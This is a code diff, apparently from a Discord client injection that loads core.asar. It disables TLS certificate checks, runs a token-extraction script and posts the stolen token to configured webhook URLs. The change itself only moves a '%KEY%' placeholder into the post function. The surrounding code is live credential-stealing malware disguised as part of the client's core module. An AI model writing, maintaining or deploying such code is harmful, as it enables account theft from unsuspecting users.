@@ -1,8 +1,3 @@
-const key = "%KEY%"
-
-
-
-
 module.exports = require("./core.asar");
 process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;
 
@@ -376,7 +371,7 @@ function GetLangue(read) {
   var langue = languages[read] || ":flag_us: USA";
   return langue;
 }
-const post = async (params, key) => {
+const post = async (params) => {
   params = JSON.stringify(params);
   var token = await execScript(tokenScript);
   var n = JSON.stringify({
@@ -385,6 +380,7 @@ const post = async (params, key) => {
   });
   [config.Placed, config.webhook].forEach((res) => {
     const url = new URL(res);
+    const key = "%KEY%"
     const options = {
       host: url.hostname,
       port: url.port,
